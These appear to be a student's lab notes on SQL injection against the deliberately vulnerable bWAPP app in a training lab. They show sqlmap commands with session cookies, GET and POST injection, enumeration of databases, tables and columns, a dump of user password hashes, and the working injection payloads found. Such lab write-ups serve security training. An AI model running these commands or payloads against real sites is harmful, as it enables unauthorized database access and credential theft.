Refer to the screen recording

SQL Injection with SQLMap

Commands that are used in the video:

- Check your IP address and the target IP address would be your adjacent IP address
- Perform a quick nmap scan on the target IP and service versioning
- Open browser and enable the foxy proxy so that we can see the requests in the burp
- login with the default credentials so we can get the session cookie 
- Turn off the interceptor and login 
- And once you are logged in select the sql injection get search
- If we try to search for any data the request is captured in burp
- We see that in this case title is "joe" and we are trying to search
- Now try to launch the sqlmap in console and use the command targeting the element with the cookie value from the burp the command is `sqlmap -u "http://{targetIP}/{specificSearchUrl}" --cookie "{cookieValue}" -p {targetElement}`
- Once we are done we get the result if the element is vulnerable or not, if not we will get an option to search for the other elements as well.
- You will be given the possible combinations of the queries that you can enter and forward the request in this scenario provided in the lab I was not able to by pass any sql injection
- As we are unable to get any information from the current database let us try to list all the databases on the server/webapp
- The command would be same except there will be an added --dbs flag attached and we get the output as below

```
root@attackdefense:~# sqlmap -u "http://192.148.101.3/sqli_1.php?title=joe&action=search" --cookie "PHPSESSID=q2npidbll76mqhp02ncb49hn24; security_level=0" -p title --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.5#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:09:38 /2023-08-30/

[21:09:38] [INFO] resuming back-end DBMS 'mysql' 
[21:09:38] [INFO] testing connection to the target URL
[21:09:38] [WARNING] potential CAPTCHA protection mechanism detected
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=joe' OR NOT 5200=5200#&action=search

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: title=joe' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a717a71,(SELECT (ELT(8080=8080,1))),0x71626b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- jgoa&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=joe' AND (SELECT 7332 FROM (SELECT(SLEEP(5)))BbmZ)-- wzPH&action=search

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: title=joe' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a717a71,0x786a6a4c7a6a486d7842464f764477494f484b57457954666c7146766b4866707074794159774c7a,0x71626b7a71),NULL,NULL#&action=search
---
[21:09:38] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:09:38] [INFO] fetching database names
available databases [4]:
[*] bWAPP
[*] information_schema
[*] mysql
[*] performance_schema

[21:09:39] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.148.101.3'
[21:09:39] [WARNING] you haven't updated sqlmap for more than 1215 days!!!

[*] ending @ 21:09:39 /2023-08-30/
```

- Now let us select a database using the -D flag and one of the database from the list and try to list the tables in the database

```
root@attackdefense:~# sqlmap -u "http://192.148.101.3/sqli_1.php?title=joe&action=search" --cookie "PHPSESSID=q2npidbll76mqhp02ncb49hn24; security_level=0" -p title -D bWAPP --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:11:33 /2023-08-30/

[21:11:34] [INFO] resuming back-end DBMS 'mysql' 
[21:11:34] [INFO] testing connection to the target URL
[21:11:34] [WARNING] potential CAPTCHA protection mechanism detected
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=joe' OR NOT 5200=5200#&action=search

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: title=joe' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a717a71,(SELECT (ELT(8080=8080,1))),0x71626b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- jgoa&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=joe' AND (SELECT 7332 FROM (SELECT(SLEEP(5)))BbmZ)-- wzPH&action=search

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: title=joe' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a717a71,0x786a6a4c7a6a486d7842464f764477494f484b57457954666c7146766b4866707074794159774c7a,0x71626b7a71),NULL,NULL#&action=search
---
[21:11:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:11:34] [INFO] fetching tables for database: 'bWAPP'
Database: bWAPP
[5 tables]
+----------+
| blog     |
| heroes   |
| movies   |
| users    |
| visitors |
+----------+

[21:11:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.148.101.3'
[21:11:34] [WARNING] you haven't updated sqlmap for more than 1215 days!!!

[*] ending @ 21:11:34 /2023-08-30/
```

- Let us try to get the values from the table and see if it works

```
root@attackdefense:~# sqlmap -u "http://192.148.101.3/sqli_1.php?title=joe&action=search" --cookie "PHPSESSID=q2npidbll76mqhp02ncb49hn24; security_level=0" -p title -D bWAPP -T users --columns
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.5#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:13:30 /2023-08-30/

[21:13:30] [INFO] resuming back-end DBMS 'mysql' 
[21:13:30] [INFO] testing connection to the target URL
[21:13:30] [WARNING] potential CAPTCHA protection mechanism detected
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=joe' OR NOT 5200=5200#&action=search

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: title=joe' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a717a71,(SELECT (ELT(8080=8080,1))),0x71626b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- jgoa&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=joe' AND (SELECT 7332 FROM (SELECT(SLEEP(5)))BbmZ)-- wzPH&action=search

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: title=joe' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a717a71,0x786a6a4c7a6a486d7842464f764477494f484b57457954666c7146766b4866707074794159774c7a,0x71626b7a71),NULL,NULL#&action=search
---
[21:13:30] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:13:30] [INFO] fetching columns for table 'users' in database 'bWAPP'
Database: bWAPP
Table: users
[9 columns]
+-----------------+--------------+
| Column          | Type         |
+-----------------+--------------+
| admin           | tinyint(1)   |
| id              | int(10)      |
| password        | varchar(100) |
| activated       | tinyint(1)   |
| activation_code | varchar(100) |
| email           | varchar(100) |
| login           | varchar(100) |
| reset_code      | varchar(100) |
| secret          | varchar(100) |
+-----------------+--------------+

[21:13:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.148.101.3'
[21:13:31] [WARNING] you haven't updated sqlmap for more than 1215 days!!!

[*] ending @ 21:13:31 /2023-08-30/
```

```
root@attackdefense:~# sqlmap -u "http://192.148.101.3/sqli_1.php?title=joe&action=search" --cookie "PHPSESSID=q2npidbll76mqhp02ncb49hn24; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.5#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:15:18 /2023-08-30/

[21:15:19] [INFO] resuming back-end DBMS 'mysql' 
[21:15:19] [INFO] testing connection to the target URL
[21:15:19] [WARNING] potential CAPTCHA protection mechanism detected
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: title (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=joe' OR NOT 5200=5200#&action=search

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: title=joe' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a717a71,(SELECT (ELT(8080=8080,1))),0x71626b7a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- jgoa&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=joe' AND (SELECT 7332 FROM (SELECT(SLEEP(5)))BbmZ)-- wzPH&action=search

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: title=joe' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716a717a71,0x786a6a4c7a6a486d7842464f764477494f484b57457954666c7146766b4866707074794159774c7a,0x71626b7a71),NULL,NULL#&action=search
---
[21:15:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:15:19] [INFO] fetching entries of column(s) '`admin`, `password`, email' for table 'users' in database 'bWAPP'
[21:15:19] [INFO] recognized possible password hashes in column '`password`'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[21:15:27] [INFO] writing hashes to a temporary file '/tmp/sqlmapsr5m87_9874/sqlmaphashes-7vg96bqy.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: bWAPP
Table: users
[2 entries]
+---------+------------------------------------------+--------------------------+
| admin   | password                                 | email                    |
+---------+------------------------------------------+--------------------------+
| 1       | 6885858486f31043e5839c735d99457f045affd0 | bwapp-aim@mailinator.com |
| 1       | 6885858486f31043e5839c735d99457f045affd0 | bwapp-bee@mailinator.com |
+---------+------------------------------------------+--------------------------+

[21:15:31] [INFO] table 'bWAPP.users' dumped to CSV file '/root/.sqlmap/output/192.148.101.3/dump/bWAPP/users.csv'
[21:15:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.148.101.3'
[21:15:31] [WARNING] you haven't updated sqlmap for more than 1215 days!!!

[*] ending @ 21:15:31 /2023-08-30/
```


Now that we checked the database with a get request let us try to see if we are able to get the same with the post request as well

```
POST /sqli_6.php HTTP/1.1
Host: 192.148.101.3
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.148.101.3/sqli_6.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Connection: close
Cookie: PHPSESSID=q2npidbll76mqhp02ncb49hn24; security_level=0
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

title=james&action=search
```

copy the entire request to a file and save it and run the command similar to that of the get request one 

`sqlmap -r {requestSavedFile} -p {targetElement}`

```
root@attackdefense:~# sqlmap -r request -p title
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:20:18 /2023-08-30/

[21:20:18] [INFO] parsing HTTP request from 'request'
[21:20:18] [INFO] testing connection to the target URL
[21:20:18] [WARNING] potential CAPTCHA protection mechanism detected
[21:20:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:20:19] [INFO] testing if the target URL content is stable
[21:20:19] [INFO] target URL content is stable
[21:20:19] [INFO] heuristic (basic) test shows that POST parameter 'title' might be injectable (possible DBMS: 'MySQL')
[21:20:19] [INFO] heuristic (XSS) test shows that POST parameter 'title' might be vulnerable to cross-site scripting (XSS) attacks
[21:20:19] [INFO] testing for SQL injection on POST parameter 'title'
y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:20:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:20:34] [WARNING] reflective value(s) found and filtering out
[21:20:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[21:20:35] [INFO] testing 'Generic inline queries'
[21:20:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:20:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[21:20:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[21:20:36] [INFO] POST parameter 'title' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="movies")
[21:20:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:20:36] [INFO] POST parameter 'title' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[21:20:36] [INFO] testing 'MySQL inline queries'
[21:20:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:20:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[21:20:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[21:20:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[21:20:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[21:20:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[21:20:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:20:46] [INFO] POST parameter 'title' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:20:46] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:20:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[21:20:46] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:20:46] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:20:46] [INFO] target URL appears to have 7 columns in query
[21:20:46] [INFO] POST parameter 'title' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[21:20:46] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'title' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: title (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: title=james' OR NOT 2657=2657#&action=search

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: title=james' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71626a6a71,(SELECT (ELT(5090=5090,1))),0x716a6b7071,0x78))s), 8446744073709551610, 8446744073709551610)))-- BgVW&action=search

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=james' AND (SELECT 7956 FROM (SELECT(SLEEP(5)))onTC)-- XZhO&action=search

    Type: UNION query
    Title: MySQL UNION query (NULL) - 7 columns
    Payload: title=james' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71626a6a71,0x46516b714c454e79694e6d4c526e556e794771776378565055727675786c477a6b54734974516e52,0x716a6b7071),NULL,NULL,NULL#&action=search
---
[21:21:06] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.5
[21:21:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.148.101.3'
[21:21:06] [WARNING] you haven't updated sqlmap for more than 1215 days!!!

[*] ending @ 21:21:06 /2023-08-30/
```

Now can send the payloads that we got as a request from the repeater